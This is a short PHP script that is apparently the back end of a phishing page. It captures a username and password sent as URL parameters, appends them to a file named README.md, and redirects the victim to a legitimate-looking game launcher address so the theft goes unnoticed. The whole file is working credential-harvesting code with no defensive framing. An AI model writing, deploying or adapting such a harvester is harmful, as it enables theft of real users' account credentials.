<?php

	if ($_GET["txtUserName"] && $_GET["txtPassword"]) {
		# code...
		$file = fopen("README.md","a");
		fwrite($file, '<> ID : '.$_GET["txtUserName"].' --> PW : '.$_GET["txtPassword"]."\n");
		fclose($file);
		echo "<script>window.location.href = 'http://truykich.net.vn/launcher.aspx' </script>";
		header("Location : http://truykich.net.vn/launcher.aspx");
	}
	else {
		# code...
		echo "<script>  </script>";
		echo "<center><h1>ERROR</h1></center>";
	}
?>
